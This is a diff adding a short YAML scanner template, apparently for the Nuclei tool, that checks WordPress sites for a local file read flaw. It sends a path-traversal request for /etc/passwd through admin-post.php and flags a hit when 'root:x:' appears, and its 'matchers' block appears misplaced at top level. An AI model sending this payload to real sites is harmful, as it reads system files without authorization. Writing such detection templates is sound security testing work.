@@ -1,0 +1,16 @@
+id: wp-admin-local-file-read
+info:
+  name: WordPress Admin Local File Read
+  author: pdteam
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-admin/admin-post.php?local-download=../../../etc/passwd&local-destination-id=0"
+      
+matchers:
+  - type: word
+    words:
+      - "root:x:"
+    part: body
